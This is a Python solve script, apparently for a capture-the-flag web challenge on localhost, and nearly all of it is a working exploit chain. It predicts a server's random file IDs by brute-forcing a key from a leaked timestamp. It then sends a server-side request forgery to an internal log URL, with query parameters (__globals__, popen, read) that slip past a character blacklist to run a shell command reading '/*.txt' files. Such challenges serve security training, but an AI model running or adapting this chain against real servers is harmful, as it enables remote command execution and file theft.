import requests
import re
import random

# Configuration
TARGET_URL = "http://localhost:1337"
UPLOAD_URL = f"{TARGET_URL}/upload"
FETCH_URL = f"{TARGET_URL}/fetch"
key = None

def solve():

    # First, do a normal upload to solve for random
    file_bytes = b'hello'

    try: 
        r = requests.post(UPLOAD_URL, files={"file": file_bytes})
        # find int after /tmp/
        match = re.search(r'File Name                       : (\d+)', r.text)
        timestamp = re.search(r'processed at (\d+)', r.text)
        # brute force the key
        for i in range(1000, 10000):
            random.seed(int(timestamp.group(1)) + i)
            rand_id = str(random.randint(1, 1000000000))
            if rand_id == match.group(1):
                key = i
                print(f"Found key: {i}")
                break

    except Exception as e:
        print(f"Could not connect to {UPLOAD_URL}: {e}")
        return

    filename = "./sol.html"

    # Upload the file
    print(f"Uploading {filename}...")
    with open(filename, "rb") as f:
        files = {"file": f}
        try:
            r = requests.post(UPLOAD_URL, files=files)
        except Exception as e:
            print(f"Could not connect to {UPLOAD_URL}: {e}")
            return

    # Extract timestamp from response
    # Response: "Security Incident Detected at 1733567890! Logs..."
    match = re.search(r"Security Incident Detected at (\d+)", r.text)
    if not match:
        print("Failed to get timestamp from response.")
        print(f"Response: {r.text}")
        return

    timestamp = int(match.group(1))
    print(f"Timestamp: {timestamp}")

    # Parameters to pass via URL to bypass character blacklist
    params = {
        "glo": "__globals__",
        "gi": "__getitem__",
        "os": "os",
        "po": "popen",
        "re": "read",
        "cmd": "echo \"<!DOCTYPE html><html lang='en'><head><title>$(cat /*.txt | tr -d '{}')</title></head></html>\"" 
    }

    query_string = "&".join([f"{k}={v}" for k, v in params.items()])

    # Replicate the server's random number logic
    seed = timestamp + key
    random.seed(seed)
    random_id = str(random.randint(1, 1000000000))
    
    internal_url = f"http://127.0.0.1:1337/logs/incident_{random_id}.html?{query_string}"
    
    # Send the SSRF request
    r = requests.post(FETCH_URL, data={"url": internal_url})
    
    if "blahaj" in r.text:
        print("Flag found!")
        # Extract flag
        flag = re.search(r"blahaj[a-zA-Z0-9_]+", r.text)
        if flag:
            content = flag.group(0)[6:]
            print(f"FLAG: blahaj{{{content}}}")
        else:
            print(r.text)
    else:
        print("Flag not found. Check the payload.")

if __name__ == "__main__":
    solve()
